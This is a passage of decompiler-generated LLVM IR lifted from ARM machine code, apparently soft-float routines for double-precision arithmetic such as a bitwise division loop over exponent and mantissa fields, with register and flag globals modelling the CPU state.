bb13:                                             ; preds = %dec_label_pc_18368
  %tmp21 = sext i1 %tmp20 to i32
  %v6_18390 = add nsw i32 %tmp21, -1
  %v7_18390 = and i32 %v5_18384, %v6_18390
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_18368, %bb13
  %v1_18398 = phi i32 [ %v5_18384, %dec_label_pc_18368 ], [ %v7_18390, %bb13 ]
  %v2_18394 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_18394, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_18398

dec_label_pc_1839c:                               ; preds = %dec_label_pc_18360
  %v1_1839c = sub i32 0, %v2_18358
  %v1_183a0 = add i32 %v2_18358, 32
  %v0_183a4 = load i32, i32* @r0, align 4
  %v6_183a4 = shl i32 %v0_183a4, %v1_1839c
  store i32 %v6_183a4, i32* @r3, align 4
  %v6_183a8 = lshr i32 %v0_183a4, %v1_183a0
  %v1_183ac = load i32, i32* @r1, align 4
  %v7_183ac = shl i32 %v1_183ac, %v1_1839c
  %v8_183ac = or i32 %v7_183ac, %v6_183a8
  %v1_183b0 = and i32 %v1_183ac, -2147483648
  %tmp22 = icmp slt i32 %v6_183a4, 0
  %v4_183b4 = zext i1 %tmp22 to i32
  %v5_183b4 = add i32 %v8_183ac, %v4_183b4
  %v6_183b4 = icmp ult i32 %v5_183b4, %v8_183ac
  %v2_183b8 = zext i1 %v6_183b4 to i32
  %v3_183b8 = or i32 %v2_183b8, %v1_183b0
  store i32 %v3_183b8, i32* @r1, align 4
  %v9_183b8 = add nsw i32 %v3_183b8, %v2_183b8
  %v10_183b8 = sub i32 0, %v1_183ac
  %v11_183b8 = and i32 %v9_183b8, %v10_183b8
  %v12_183b8 = icmp slt i32 %v11_183b8, 0
  store i1 %v12_183b8, i1* @cpsr_v, align 1
  %v3_183bc = mul i32 %v6_183a4, 2
  %v4_183bc = or i32 %v3_183bc, %tmp7
  %v5_183bc = icmp slt i32 %v4_183bc, 0
  store i1 %v5_183bc, i1* @cpsr_n, align 1
  %v6_183bc = icmp eq i32 %v4_183bc, 0
  store i1 %v6_183bc, i1* @cpsr_z, align 1
  br i1 %v6_183bc, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1839c
  %tmp23 = sext i1 %tmp22 to i32
  %v6_183c0 = add nsw i32 %tmp23, -1
  %v7_183c0 = and i32 %v5_183b4, %v6_183c0
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1839c, %bb15
  %v1_183c8 = phi i32 [ %v5_183b4, %dec_label_pc_1839c ], [ %v7_183c0, %bb15 ]
  %v2_183c4 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_183c4, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_183c8

dec_label_pc_183cc:                               ; preds = %.thread1
  %v1_183cc = sub i32 32, %v2_18358
  %v1_183d0 = load i32, i32* @r0, align 4
  %v7_183d0 = shl i32 %v1_183d0, %v1_183cc
  %v8_183d0 = or i32 %v7_183d0, %tmp7
  %v6_183d4 = lshr i32 %v1_183d0, %v2_18358
  %v1_183d8 = load i32, i32* @r1, align 4
  %v7_183d8 = shl i32 %v1_183d8, %v1_183cc
  %v8_183d8 = or i32 %v7_183d8, %v6_183d4
  store i32 %v8_183d8, i32* @r3, align 4
  %v6_183dc = lshr i32 %v1_183d8, %v2_18358
  %v1_183e0 = and i32 %v1_183d8, -2147483648
  store i32 %v1_183e0, i32* @r1, align 4
  %v7_183e4 = lshr i32 %v1_183e0, %v2_18358
  %v8_183e4 = sub i32 -1, %v7_183e4
  %v9_183e4 = and i32 %v6_183dc, %v8_183e4
  %tmp24 = icmp slt i32 %v8_183d8, 0
  %v4_183e8 = zext i1 %tmp24 to i32
  %v5_183e8 = add i32 %v4_183e8, %v9_183e4
  %v3_183ec = mul i32 %v8_183d8, 2
  %v4_183ec = or i32 %v8_183d0, %v3_183ec
  %v5_183ec = icmp slt i32 %v4_183ec, 0
  store i1 %v5_183ec, i1* @cpsr_n, align 1
  %v6_183ec = icmp eq i32 %v4_183ec, 0
  store i1 %v6_183ec, i1* @cpsr_z, align 1
  br i1 %v6_183ec, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_183cc
  %tmp25 = sext i1 %tmp24 to i32
  %v6_183f0 = add nsw i32 %tmp25, -1
  %v7_183f0 = and i32 %v5_183e8, %v6_183f0
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_183cc, %bb17
  %v1_183f8 = phi i32 [ %v5_183e8, %dec_label_pc_183cc ], [ %v7_183f0, %bb17 ]
  %v2_183f4 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_183f4, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_183f8

dec_label_pc_184b8:                               ; preds = %dec_label_pc_1833c
  %v0_184b8 = load i32, i32* @r1, align 4
  %v1_184b8 = and i32 %v0_184b8, -2147483648
  %v1_184c0 = or i32 %v1_184b8, 2146435072
  store i32 %v1_184c0, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_183e8, { 1, 0 }
  uselistorder i32 %v5_183b4, { 1, 0, 2 }
  uselistorder i32 %v8_183ac, { 1, 0 }
  uselistorder i32 %v1_1839c, { 1, 0 }
  uselistorder i32 %v5_18384, { 1, 0 }
  uselistorder i32 %v1_18378, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1836c, { 1, 0 }
  uselistorder i32 %v2_18358, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_18354, { 1, 0 }
  uselistorder i32 %v4_18340, { 1, 2, 0 }
  uselistorder i32 %v0_18340, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 68, 69, 44, 51, 8, 52, 54, 3, 1, 2, 55, 56, 5, 0, 4, 63, 28, 10, 29, 11, 12, 53, 50, 13, 64, 65, 9, 128, 129, 130, 131, 132, 134, 135, 133, 136, 137, 138, 139, 140, 141, 142, 14, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 15, 45, 46, 47, 48, 49, 30, 31, 16, 32, 33, 34, 39, 127, 35, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 6, 57, 58, 59, 60, 61, 17, 62, 18, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 120, 113, 114, 115, 116, 117, 118, 119, 121, 122, 19, 123, 124, 7, 66, 20, 21, 22, 24, 23, 25, 83, 125, 126, 26, 38, 27, 36, 37, 40, 41, 42, 43, 67, 84 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_184d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_184d0:
  %v1_184d4 = or i32 %arg1, 2146959360
  store i32 %v1_184d4, i32* @r1, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_184dc = load i32, i32* @r0, align 4
  ret i32 %v1_184dc
}

define i32 @function_184e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_184e0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_184e0 = load i32, i32* @r4, align 4
  store i32 %v3_184e0, i32* %stack_var_-16, align 4
  %v6_184e0 = load i32, i32* @r5, align 4
  %v9_184e0 = load i32, i32* @r6, align 4
  %v12_184e0 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_184ec = load i32, i32* @r1, align 4
  %v4_184ec = udiv i32 %v1_184ec, 1048576
  %v5_184ec = urem i32 %v4_184ec, 2048
  store i32 %v5_184ec, i32* @r4, align 4
  %v6_184ec = icmp eq i32 %v5_184ec, 0
  br i1 %v6_184ec, label %dec_label_pc_184e0..thread2_crit_edge, label %bb

dec_label_pc_184e0..thread2_crit_edge:            ; preds = %dec_label_pc_184e0
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_184e0
  %v5_184f0 = udiv i32 %arg4, 1048576
  %v6_184f0 = urem i32 %v5_184f0, 2048
  store i32 %v6_184f0, i32* %r5.global-to-local, align 4
  %v7_184f0 = icmp eq i32 %v6_184f0, 0
  br i1 %v7_184f0, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1867c

bb90:                                             ; preds = %bb
  %v5_184f4 = icmp eq i32 %v5_184ec, 2047
  br i1 %v5_184f4, label %.thread2, label %bb91

.thread2:                                         ; preds = %dec_label_pc_184e0..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %dec_label_pc_184e0..thread2_crit_edge ], [ %v5_184f0, %bb90 ]
  br label %dec_label_pc_1867c

bb91:                                             ; preds = %bb90
  %v5_184f8 = icmp eq i32 %v6_184f0, 2047
  br i1 %v5_184f8, label %dec_label_pc_1867c, label %dec_label_pc_18500

dec_label_pc_18500:                               ; preds = %bb91
  %v2_18500 = sub nsw i32 %v5_184ec, %v6_184f0
  store i32 %v2_18500, i32* %r4.global-to-local, align 4
  %v2_18504 = xor i32 %v1_184ec, %arg4
  %v4_18508 = mul i32 %arg4, 4096
  %v5_18508 = or i32 %v4_18508, %arg3
  store i32 %v5_18508, i32* %r5.global-to-local, align 4
  %v7_18508 = icmp eq i32 %v5_18508, 0
  %v3_1850c = mul i32 %v1_184ec, 4096
  store i32 %v3_1850c, i32* %r1.global-to-local, align 4
  br i1 %v7_18508, label %dec_label_pc_18648, label %dec_label_pc_18514

dec_label_pc_18514:                               ; preds = %dec_label_pc_18500
  %tmp92 = mul i32 %arg4, 256
  %v4_1851c = and i32 %tmp92, 268435200
  %v4_18520 = udiv i32 %arg3, 16777216
  %v5_1851c = or i32 %v4_18520, %v4_1851c
  %v5_18520 = or i32 %v5_1851c, 268435456
  store i32 %v5_18520, i32* %r3.global-to-local, align 4
  %v3_18524 = mul i32 %arg3, 256
  store i32 %v3_18524, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_184ec, 256
  %v4_18528 = and i32 %tmp93, 268435200
  %v1_1852c = load i32, i32* @r0, align 4
  %v4_1852c = udiv i32 %v1_1852c, 16777216
  %v5_18528 = or i32 %v4_18528, %v4_1852c
  %v5_1852c = or i32 %v5_18528, 268435456
  store i32 %v5_1852c, i32* %r5.global-to-local, align 4
  %v3_18530 = mul i32 %v1_1852c, 256
  store i32 %v3_18530, i32* %r6.global-to-local, align 4
  %v1_18534 = and i32 %v2_18504, -2147483648
  store i32 %v1_18534, i32* %r1.global-to-local, align 4
  %v3_18538 = icmp uge i32 %v5_1852c, %v5_18520
  %v9_18538 = icmp eq i32 %v5_1852c, %v5_18520
  br i1 %v9_18538, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_18514
  %v4_1853c = icmp uge i32 %v3_18530, %v3_18524
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_18514, %bb94
  %v1_18540 = phi i1 [ %v3_18538, %dec_label_pc_18514 ], [ %v4_1853c, %bb94 ]
  %v2_18540 = add nsw i32 %v2_18500, 253
  %v3_18540 = zext i1 %v1_18540 to i32
  %v4_18540 = add nsw i32 %v2_18540, %v3_18540
  %v8_18540 = icmp ule i32 %v4_18540, %v2_18500
  %v9_18540 = icmp ugt i32 %v2_18500, -254
  %v10_18540 = select i1 %v1_18540, i1 %v8_18540, i1 %v9_18540
  %v1_18544 = add nsw i32 %v4_18540, 768
  store i32 %v1_18544, i32* %r4.global-to-local, align 4
  br i1 %v10_18540, label %dec_label_pc_18554, label %dec_label_pc_1854c

dec_label_pc_1854c:                               ; preds = %bb95
  %v3_1854c = udiv i32 %v5_18520, 2
  store i32 %v3_1854c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18554

dec_label_pc_18554:                               ; preds = %bb95, %dec_label_pc_1854c
  %v0_1855c = phi i32 [ %v5_18520, %bb95 ], [ %v3_1854c, %dec_label_pc_1854c ]
  %v0_18560 = phi i32 [ %v3_18524, %bb95 ], [ 0, %dec_label_pc_1854c ]
  %v2_18554 = sub i32 %v3_18530, %v0_18560
  store i32 %v2_18554, i32* %r6.global-to-local, align 4
  %v3_18554 = icmp uge i32 %v3_18530, %v0_18560
  %v3_18558 = icmp eq i1 %v3_18554, false
  %v4_18558 = sub nsw i32 %v5_1852c, %v0_1855c
  %v6_18558 = sext i1 %v3_18558 to i32
  %v7_18558 = add nsw i32 %v6_18558, %v4_18558
  store i32 %v7_18558, i32* %r5.global-to-local, align 4
  %v3_1855c = udiv i32 %v0_1855c, 2
  store i32 %v3_1855c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1856c.outer

dec_label_pc_1856c.outer:                         ; preds = %dec_label_pc_18604, %dec_label_pc_18554
  %v1_18618.ph = phi i32 [ %v2_18604, %dec_label_pc_18604 ], [ %v1_18534, %dec_label_pc_18554 ]
  %v0_18570.ph = phi i32 [ %v5_185e0, %dec_label_pc_18604 ], [ %v7_18558, %dec_label_pc_18554 ]
  %v1_18574.ph = phi i32 [ %v3_185e4, %dec_label_pc_18604 ], [ %v2_18554, %dec_label_pc_18554 ]
  %v5_185ec17.ph = phi i32 [ %v5_185ec, %dec_label_pc_18604 ], [ %v3_1855c, %dec_label_pc_18554 ]
  %v3_185f013.ph = phi i32 [ %v3_185f0, %dec_label_pc_18604 ], [ 0, %dec_label_pc_18554 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_18604 ], [ 1048576, %dec_label_pc_18554 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_18604 ], [ 524288, %dec_label_pc_18554 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1856c

dec_label_pc_1856c:                               ; preds = %dec_label_pc_1856c.outer, %dec_label_pc_185dc
  %v1_185d059 = phi i32 [ %v2_18618, %dec_label_pc_185dc ], [ %storemerge133, %dec_label_pc_1856c.outer ]
  %v1_1857c = phi i32 [ %v1_1857c32, %dec_label_pc_185dc ], [ %storemerge133, %dec_label_pc_1856c.outer ]
  %v1_1859841 = phi i32 [ %v1_1859843, %dec_label_pc_185dc ], [ %storemerge133, %dec_label_pc_1856c.outer ]
  %v1_185b450 = phi i32 [ %v1_185b452, %dec_label_pc_185dc ], [ %storemerge133, %dec_label_pc_1856c.outer ]
  %v0_185f4 = phi i32 [ %v3_185f4, %dec_label_pc_185dc ], [ %storemerge, %dec_label_pc_1856c.outer ]
  %v0_18570 = phi i32 [ %v5_185e0, %dec_label_pc_185dc ], [ %v0_18570.ph, %dec_label_pc_1856c.outer ]
  %v1_18574 = phi i32 [ %v3_185e4, %dec_label_pc_185dc ], [ %v1_18574.ph, %dec_label_pc_1856c.outer ]
  %v5_185ec17 = phi i32 [ %v5_185ec, %dec_label_pc_185dc ], [ %v5_185ec17.ph, %dec_label_pc_1856c.outer ]
  %v3_185f013 = phi i32 [ %v3_185f0, %dec_label_pc_185dc ], [ %v3_185f013.ph, %dec_label_pc_1856c.outer ]
  %v3_1856c = icmp uge i32 %v1_18574, %v3_185f013
  %v3_18570 = icmp eq i1 %v3_1856c, false
  %v4_18570 = sub i32 %v0_18570, %v5_185ec17
  %v6_18570 = sext i1 %v3_18570 to i32
  %v7_18570 = add i32 %v6_18570, %v4_18570
  %v8_18570 = zext i1 %v3_18570 to i32
  %v9_18570 = sub i32 %v7_18570, %v8_18570
  %v10_18570 = icmp ult i32 %v0_18570, %v9_18570
  %v11_18570 = icmp ne i32 %v5_185ec17, -1
  %v12_18570 = or i1 %v11_18570, %v10_18570
  %v13_18570 = icmp ult i32 %v0_18570, %v5_185ec17
  %v14_18570 = select i1 %v3_18570, i1 %v12_18570, i1 %v13_18570
  br i1 %v14_18570, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1856c
  %v3_18574 = sub i32 %v1_18574, %v3_185f013
  store i32 %v3_18574, i32* %r6.global-to-local, align 4
  store i32 %v7_18570, i32* %r5.global-to-local, align 4
  %v3_1857c = or i32 %v1_1857c, %v0_185f4
  store i32 %v3_1857c, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1856c, %bb96
  %v1_185d058 = phi i32 [ %v1_185d059, %dec_label_pc_1856c ], [ %v3_1857c, %bb96 ]
  %v1_1857c35 = phi i32 [ %v1_1857c, %dec_label_pc_1856c ], [ %v3_1857c, %bb96 ]
  %v1_18598 = phi i32 [ %v1_1859841, %dec_label_pc_1856c ], [ %v3_1857c, %bb96 ]
  %v1_185b449 = phi i32 [ %v1_185b450, %dec_label_pc_1856c ], [ %v3_1857c, %bb96 ]
  %v0_1858c = phi i32 [ %v0_18570, %dec_label_pc_1856c ], [ %v7_18570, %bb96 ]
  %v1_18590 = phi i32 [ %v1_18574, %dec_label_pc_1856c ], [ %v3_18574, %bb96 ]
  %v1_18580 = urem i32 %v5_185ec17, 2
  %v2_18580 = icmp ne i32 %v1_18580, 0
  %v3_18580 = udiv i32 %v5_185ec17, 2
  %v3_18584 = zext i1 %v2_18580 to i32
  %v6_18584 = zext i32 %v3_185f013 to i64
  %v7_18584 = sub i32 33, %v3_185f013
  %v8_18584 = zext i32 %v7_18584 to i64
  %v9_18584 = shl i64 %v6_18584, %v8_18584
  %v10_18584 = sub i32 32, %v3_185f013
  %v11_18584 = shl i32 %v3_18584, %v10_18584
  %v12_18584 = zext i32 %v11_18584 to i64
  %v14_18584 = or i64 %v12_18584, %v9_18584
  %v15_18584 = trunc i64 %v14_18584 to i32
  %v3_18588 = icmp uge i32 %v1_18590, %v15_18584
  %v3_1858c = icmp eq i1 %v3_18588, false
  %v4_1858c = sub i32 %v0_1858c, %v3_18580
  %v6_1858c = sext i1 %v3_1858c to i32
  %v7_1858c = add i32 %v6_1858c, %v4_1858c
  %v13_1858c = icmp ult i32 %v0_1858c, %v3_18580
  %v14_1858c = or i1 %v13_1858c, %v3_1858c
  br i1 %v14_1858c, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_18590 = sub i32 %v1_18590, %v15_18584
  store i32 %v3_18590, i32* %r6.global-to-local, align 4
  store i32 %v7_1858c, i32* %r5.global-to-local, align 4
  %v5_18598 = udiv i32 %v0_185f4, 2
  %v6_18598 = or i32 %v1_18598, %v5_18598
  store i32 %v6_18598, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_185d057 = phi i32 [ %v1_185d058, %.thread4 ], [ %v6_18598, %bb97 ]
  %v1_1857c34 = phi i32 [ %v1_1857c35, %.thread4 ], [ %v6_18598, %bb97 ]
  %v1_1859845 = phi i32 [ %v1_18598, %.thread4 ], [ %v6_18598, %bb97 ]
  %v1_185b4 = phi i32 [ %v1_185b449, %.thread4 ], [ %v6_18598, %bb97 ]
  %v0_185a8 = phi i32 [ %v0_1858c, %.thread4 ], [ %v7_1858c, %bb97 ]
  %v1_185ac = phi i32 [ %v1_18590, %.thread4 ], [ %v3_18590, %bb97 ]
  %v1_1859c = urem i32 %v3_18580, 2
  %v2_1859c = icmp ne i32 %v1_1859c, 0
  %v3_1859c = udiv i32 %v5_185ec17, 4
  %v3_185a0 = zext i1 %v2_1859c to i32
  %v6_185a0 = and i64 %v14_18584, 4294967295
  %v7_185a0 = sub i32 33, %v15_18584
  %v8_185a0 = zext i32 %v7_185a0 to i64
  %v9_185a0 = shl i64 %v6_185a0, %v8_185a0
  %v10_185a0 = sub i32 32, %v15_18584
  %v11_185a0 = shl i32 %v3_185a0, %v10_185a0
  %v12_185a0 = zext i32 %v11_185a0 to i64
  %v14_185a0 = or i64 %v12_185a0, %v9_185a0
  %v15_185a0 = trunc i64 %v14_185a0 to i32
  %v3_185a4 = icmp uge i32 %v1_185ac, %v15_185a0
  %v3_185a8 = icmp eq i1 %v3_185a4, false
  %v4_185a8 = sub i32 %v0_185a8, %v3_1859c
  %v6_185a8 = sext i1 %v3_185a8 to i32
  %v7_185a8 = add i32 %v6_185a8, %v4_185a8
  %v13_185a8 = icmp ult i32 %v0_185a8, %v3_1859c
  %v14_185a8 = or i1 %v13_185a8, %v3_185a8
  br i1 %v14_185a8, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_185ac = sub i32 %v1_185ac, %v15_185a0
  store i32 %v3_185ac, i32* %r6.global-to-local, align 4
  store i32 %v7_185a8, i32* %r5.global-to-local, align 4
  %v5_185b4 = udiv i32 %v0_185f4, 4
  %v6_185b4 = or i32 %v1_185b4, %v5_185b4
  store i32 %v6_185b4, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_185d0 = phi i32 [ %v1_185d057, %.thread6 ], [ %v6_185b4, %bb98 ]
  %v1_1857c33 = phi i32 [ %v1_1857c34, %.thread6 ], [ %v6_185b4, %bb98 ]
  %v1_1859844 = phi i32 [ %v1_1859845, %.thread6 ], [ %v6_185b4, %bb98 ]
  %v1_185b453 = phi i32 [ %v1_185b4, %.thread6 ], [ %v6_185b4, %bb98 ]
  %v0_185c4 = phi i32 [ %v0_185a8, %.thread6 ], [ %v7_185a8, %bb98 ]
  %v1_185c8 = phi i32 [ %v1_185ac, %.thread6 ], [ %v3_185ac, %bb98 ]
  %v1_185b8 = urem i32 %v3_1859c, 2
  %v2_185b8 = icmp ne i32 %v1_185b8, 0
  %v3_185b8 = udiv i32 %v5_185ec17, 8
  %v3_185bc = zext i1 %v2_185b8 to i32
  %v6_185bc = and i64 %v14_185a0, 4294967295
  %v7_185bc = sub i32 33, %v15_185a0
  %v8_185bc = zext i32 %v7_185bc to i64
  %v9_185bc = shl i64 %v6_185bc, %v8_185bc
  %v10_185bc = sub i32 32, %v15_185a0
  %v11_185bc = shl i32 %v3_185bc, %v10_185bc
  %v12_185bc = zext i32 %v11_185bc to i64
  %v14_185bc = or i64 %v12_185bc, %v9_185bc
  %v15_185bc = trunc i64 %v14_185bc to i32
  %v3_185c0 = icmp uge i32 %v1_185c8, %v15_185bc
  %v3_185c4 = icmp eq i1 %v3_185c0, false
  %v4_185c4 = sub i32 %v0_185c4, %v3_185b8
  %v6_185c4 = sext i1 %v3_185c4 to i32
  %v7_185c4 = add i32 %v6_185c4, %v4_185c4
  %v13_185c4 = icmp ult i32 %v0_185c4, %v3_185b8
  %v14_185c4 = or i1 %v13_185c4, %v3_185c4
  br i1 %v14_185c4, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_185c8 = sub i32 %v1_185c8, %v15_185bc
  store i32 %v3_185c8, i32* %r6.global-to-local, align 4
  store i32 %v7_185c4, i32* %r5.global-to-local, align 4
  %v5_185d0 = udiv i32 %v0_185f4, 8
  %v6_185d0 = or i32 %v1_185d0, %v5_185d0
  store i32 %v6_185d0, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_185e0 = phi i32 [ %v1_185c8, %.thread8 ], [ %v3_185c8, %bb100 ]
  %v0_185dc = phi i32 [ %v0_185c4, %.thread8 ], [ %v7_185c4, %bb100 ]
  %v2_18618 = phi i32 [ %v1_185d0, %.thread8 ], [ %v6_185d0, %bb100 ]
  %v1_1857c32 = phi i32 [ %v1_1857c33, %.thread8 ], [ %v6_185d0, %bb100 ]
  %v1_1859843 = phi i32 [ %v1_1859844, %.thread8 ], [ %v6_185d0, %bb100 ]
  %v1_185b452 = phi i32 [ %v1_185b453, %.thread8 ], [ %v6_185d0, %bb100 ]
  %v2_185d4 = or i32 %v0_185dc, %v1_185e0
  %v4_185d4 = icmp eq i32 %v2_185d4, 0
  br i1 %v4_185d4, label %dec_label_pc_18614, label %dec_label_pc_185dc

dec_label_pc_185dc:                               ; preds = %.thread10
  %v3_185dc = mul i32 %v0_185dc, 16
  %v4_185e0 = udiv i32 %v1_185e0, 268435456
  %v5_185e0 = or i32 %v3_185dc, %v4_185e0
  store i32 %v5_185e0, i32* %r5.global-to-local, align 4
  %v3_185e4 = mul i32 %v1_185e0, 16
  store i32 %v3_185e4, i32* %r6.global-to-local, align 4
  %v3_185e8 = mul nuw i32 %v3_185b8, 8
  %v4_185ec = udiv i32 %v15_185bc, 536870912
  %v5_185ec = or i32 %v4_185ec, %v3_185e8
  %v3_185f0 = mul i32 %v15_185bc, 8
  %v3_185f4 = udiv i32 %v0_185f4, 16
  store i32 %v3_185f4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_185f4, 16
  br i1 %tmp, label %dec_label_pc_185fc, label %dec_label_pc_1856c

dec_label_pc_185fc:                               ; preds = %dec_label_pc_185dc
  %v1_185fc = and i32 %v1_18618.ph, 1048576
  %v2_185fc = icmp eq i32 %v1_185fc, 0
  br i1 %v2_185fc, label %dec_label_pc_18604, label %.thread11.loopexit

dec_label_pc_18604:                               ; preds = %dec_label_pc_185fc
  %v2_18604 = or i32 %v2_18618, %v1_18618.ph
  store i32 %v2_18604, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1856c.outer

dec_label_pc_18614:                               ; preds = %.thread10
  store i32 %v15_185bc, i32* %r2.global-to-local, align 4
  store i32 %v3_185b8, i32* %r3.global-to-local, align 4
  %v1_18614 = and i32 %v1_18618.ph, 1048576
  %v2_18614 = icmp eq i32 %v1_18614, 0
  br i1 %v2_18614, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_18614
  %v3_18618 = or i32 %v2_18618, %v1_18618.ph
  store i32 %v3_18618, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_185fc
  store i32 %v3_185f0, i32* %r2.global-to-local, align 4
  store i32 %v5_185ec, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_18614, %bb101
  %v1_18620 = add nsw i32 %v4_18540, 515
  store i32 %v1_18620, i32* %ip.global-to-local, align 4
  %v2_18620 = icmp ugt i32 %v1_18544, 252
  %v7_18620 = icmp eq i32 %v1_18544, 253
  %v2_18624 = xor i1 %v7_18620, true
  %v3_18624 = and i1 %v2_18620, %v2_18624
  br i1 %v3_18624, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_18624 = icmp ugt i32 %v1_18620, 1791
  %v11_18624 = icmp eq i32 %v1_18620, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_18628 = phi i1 [ %v7_18620, %.thread11 ], [ %v11_18624, %bb102 ]
  %v0_18628 = phi i1 [ %v2_18620, %.thread11 ], [ %v6_18624, %bb102 ]
  %v2_18628 = xor i1 %v1_18628, true
  %v3_18628 = and i1 %v0_18628, %v2_18628
  call void @__pseudo_cond_branch(i1 %v3_18628, i32 ptrtoint (i32* @global_var_1833c.729 to i32))
  %v0_1862c = load i32, i32* %r5.global-to-local, align 4
  %v1_1862c = load i32, i32* %r3.global-to-local, align 4
  %v2_1862c = sub i32 %v0_1862c, %v1_1862c
  store i32 %v2_1862c, i32* @ip, align 4
  %v3_1862c = icmp uge i32 %v0_1862c, %v1_1862c
  %v9_1862c = icmp eq i32 %v0_1862c, %v1_1862c
  br i1 %v9_1862c, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_18630 = load i32, i32* %r6.global-to-local, align 4
  %v2_18630 = load i32, i32* %r2.global-to-local, align 4
  %v3_18630 = sub i32 %v1_18630, %v2_18630
  store i32 %v3_18630, i32* @ip, align 4
  %v4_18630 = icmp uge i32 %v1_18630, %v2_18630
  %v10_18630 = icmp eq i32 %v1_18630, %v2_18630
  br i1 %v10_18630, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_18634 = load i32, i32* %r0.global-to-local, align 4
  %v2_18634 = urem i32 %v1_18634, 2
  %v3_18634 = icmp ne i32 %v2_18634, 0
  %v4_18634 = udiv i32 %v1_18634, 2
  store i32 %v4_18634, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_18638 = phi i1 [ %v3_1862c, %bb103 ], [ %v4_18630, %bb104 ], [ %v3_18634, %bb105 ]
  %v0_18638 = load i32, i32* %r0.global-to-local, align 4
  %v2_18638 = zext i1 %v1_18638 to i32
  %v3_18638 = add i32 %v2_18638, %v0_18638
  store i32 %v3_18638, i32* %r0.global-to-local, align 4
  %v0_1863c = load i32, i32* %r1.global-to-local, align 4
  %v1_1863c = load i32, i32* %r4.global-to-local, align 4
  %v2_1863c = and i32 %v1_1863c, 4096
  %v3_1863c = icmp ne i32 %v2_1863c, 0
